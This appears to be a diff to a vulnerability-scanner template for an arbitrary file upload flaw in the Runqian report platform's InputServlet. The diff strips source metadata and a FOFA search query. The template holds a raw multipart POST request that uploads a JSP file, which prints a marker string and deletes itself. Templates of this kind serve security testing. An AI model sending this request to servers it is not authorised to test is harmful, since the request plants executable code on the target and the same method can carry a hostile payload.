@@ -3,12 +3,8 @@ info:
   name: 润乾报表平台 InputServlet 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/eoz5fotgz6vmiqw2'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: eoz5fotgz6vmiqw2
-    fofa: body="润乾报表"
 http:
 - raw:
   - 'POST /InputServlet?action=12 HTTP/1.1
@@ -23,14 +19,10 @@ http:
     Connection: close
 
 
-
-
     --878byugbhfverkyfhbh675667
 
 
     Content-Disposition: form-data; name="upsize"
-
-
 
 
     1024
@@ -43,8 +35,6 @@ http:
 
 
     Content-Type: image/jpeg
-
-
 
 
     <% out.println("dudesuite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
